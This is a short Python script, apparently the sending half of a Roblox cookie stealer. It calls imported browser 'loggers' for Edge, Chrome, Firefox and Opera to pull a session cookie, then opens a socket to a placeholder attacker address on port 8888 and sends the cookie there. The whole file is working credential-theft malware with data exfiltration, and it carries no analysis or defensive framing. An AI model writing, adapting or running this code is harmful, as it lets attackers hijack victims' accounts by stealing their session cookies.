import socket
from modules.loggers import *
from modules.ThreadWithReturnValue import *

addr = ('YOUR IP HERE', 8888)


def roblox_logger():
    finded_cookie = b""

    browsers = [edge_logger, chrome_logger, firefox_logger,
                opera_logger]  # improt function from './loggers.py'
    for x in browsers:
        ''' Gets the return value of finding a cookie.'''
        twrv = ThreadWithReturnValue(target=x)
        twrv.start()
        if (twrv.join() is None):
            continue
        else:
            finded_cookie = twrv.join()  # finded!
            break

    return str(finded_cookie).encode()


if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(addr)

    cookie = roblox_logger()
    s.send(cookie)
    s.close()
